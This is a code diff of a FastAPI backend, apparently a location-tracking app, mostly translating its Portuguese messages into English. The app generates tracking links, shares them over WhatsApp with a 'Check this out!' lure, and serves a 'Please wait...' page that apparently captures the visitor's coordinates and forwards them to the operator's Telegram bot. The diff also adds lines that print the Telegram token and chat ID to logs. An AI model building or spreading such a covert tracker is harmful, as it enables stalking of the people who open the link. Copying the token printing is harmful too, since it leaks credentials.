@@ -2,40 +2,38 @@ import uuid
 from fastapi import FastAPI, Form, Request
 from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
 from dotenv import load_dotenv
+from fastapi import FastAPI, Request, Form, HTTPException
+from fastapi.responses import JSONResponse, HTMLResponse, FileResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
+from dotenv import load_dotenv
 import requests
 import os
 import json
-
+import uuid
 import uvicorn
 
-# Carregar o arquivo .env
-load_dotenv()
+# Load the .env file
+load_dotenv(dotenv_path=os.path.join(os.path.dirname(__file__), '.env'))
 
-# Acessar as variáveis de ambiente
-TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
-CHAT_ID = os.getenv("CHAT_ID")
+print("TELEGRAM_TOKEN:", os.getenv("TELEGRAM_TOKEN"))
+print("CHAT_ID:", os.getenv("CHAT_ID"))
 
 app = FastAPI()
 
-# Definir o caminho correto para os arquivos estáticos
+# Define the correct path for static files
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 FRONTEND_PATH = os.path.join(BASE_DIR, "..", "frontend")
 
-# # Servir arquivos estáticos da pasta frontend
-# app.mount("/static", StaticFiles(directory=FRONTEND_PATH), name="static")
-
-# Configuração do CORS
+# CORS Configuration
 app.add_middleware(
     CORSMiddleware,
-    # Adicione o domínio do seu frontend
+    # Add the domain of your frontend
     allow_origins=["https://frontend-localizador.vercel.app"],
     allow_credentials=True,
-    # Permitir todos os métodos (GET, POST, PUT, DELETE, etc.)
     allow_methods=["*"],
-    allow_headers=["*"],  # Permitir todos os cabeçalhos
+    allow_headers=["*"],
 )
 
 
@@ -45,24 +43,25 @@ class LocationData(BaseModel):
     longitude: float
 
 
-# Banco de dados em memória
+# In-memory database
 active_links = {}
 
 
 def send_to_telegram(message: str):
-    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    telegram_token = os.getenv("TELEGRAM_TOKEN")
+    url = f"https://api.telegram.org/bot{telegram_token}/sendMessage"
     params = {
-        "chat_id": CHAT_ID,
+        "chat_id": os.getenv("CHAT_ID"),
         "text": message,
     }
     try:
         response = requests.post(url, data=params)
         response_data = response.json()
         if response.status_code != 200 or not response_data.get("ok"):
-            print(f"Erro ao enviar mensagem para o Telegram: {response_data}")
+            print(f"Error sending message to Telegram: {response_data}")
         return response_data
     except Exception as e:
-        print(f"Falha ao conectar ao Telegram: {e}")
+        print(f"Failed to connect to Telegram: {e}")
         return {"error": str(e)}
 
 
@@ -70,19 +69,19 @@ def send_to_telegram(message: str):
 async def serve_html():
     index_path = os.path.join(FRONTEND_PATH, "index.html")
     if not os.path.exists(index_path):
-        return JSONResponse(content={"error": "Arquivo index.html não encontrado"}, status_code=404)
+        raise HTTPException(status_code=404, detail="index.html not found")
     return FileResponse(index_path)
 
 
 @app.post("/send-location/")
 async def send_location(location: LocationData):
     if location.id not in active_links:
-        return JSONResponse(content={"error": "ID inválido"}, status_code=404)
+        raise HTTPException(status_code=404, detail="Invalid ID")
 
-    message = f"📍 Localização recebida!\n🌍 Latitude: {location.latitude}\n📍 Longitude: {location.longitude}"
+    message = f"📍 Location received!\n🌍 Latitude: {location.latitude}\n📍 Longitude: {location.longitude}"
     send_to_telegram(message)
 
-    return {"message": "Localização enviada!"}
+    return {"message": "Location sent!"}
 
 
 @app.get("/generate-link/")
@@ -94,9 +93,9 @@ async def generate_link():
 
 
 @app.get("/track/{tracking_id}")
-async def track_user(tracking_id: str, request: Request):
+async def track_user(tracking_id: str):
     if tracking_id not in active_links:
-        return JSONResponse(content={"error": "Link inválido"}, status_code=404)
+        raise HTTPException(status_code=404, detail="Invalid link")
 
     html_content = f"""
     <html>
@@ -121,7 +120,7 @@ async def track_user(tracking_id: str, request: Request):
         </script>
     </head>
     <body>
-        <h1>Aguarde...</h1>
+        <h1>Please wait...</h1>
     </body>
     </html>
     """
@@ -135,9 +134,9 @@ async def send_whatsapp():
     tracking_url = response_json.get("link", "")
 
     if not tracking_url:
-        return JSONResponse(content={"error": "Falha ao gerar link"}, status_code=500)
+        raise HTTPException(status_code=500, detail="Failed to generate link")
 
-    whatsapp_link = f"https://api.whatsapp.com/send?text=Confira isso! {tracking_url}"
+    whatsapp_link = f"https://api.whatsapp.com/send?text=Check this out! {tracking_url}"
     return JSONResponse(content={"whatsapp_link": whatsapp_link})
 
 
@@ -145,15 +144,15 @@ async def send_whatsapp():
 async def config_form():
     html_content = """
     <html>
-    <head><title>Configuração do Telegram Bot</title></head>
+    <head><title>Telegram Bot Configuration</title></head>
     <body>
-        <h1>Configure seu bot do Telegram</h1>
+        <h1>Configure your Telegram Bot</h1>
         <form action="/save-config" method="post">
             <label for="telegram_token">Telegram Token:</label>
             <input type="text" id="telegram_token" name="telegram_token" required><br><br>
             <label for="chat_id">Chat ID:</label>
             <input type="text" id="chat_id" name="chat_id" required><br><br>
-            <button type="submit">Salvar Configuração</button>
+            <button type="submit">Save Configuration</button>
         </form>
     </body>
     </html>
@@ -169,9 +168,8 @@ async def save_config(telegram_token: str = Form(...), chat_id: str = Form(...))
 
     load_dotenv()
 
-    return {"message": "Configuração salva com sucesso!"}
-
+    return {"message": "Configuration saved successfully!"}
 
 if __name__ == "__main__":
-    port = int(os.getenv("PORT", 8080))  # Use a variável de ambiente PORT
+    port = int(os.getenv("PORT", 8080))  # Use PORT environment variable
     uvicorn.run(app, host="0.0.0.0", port=port)
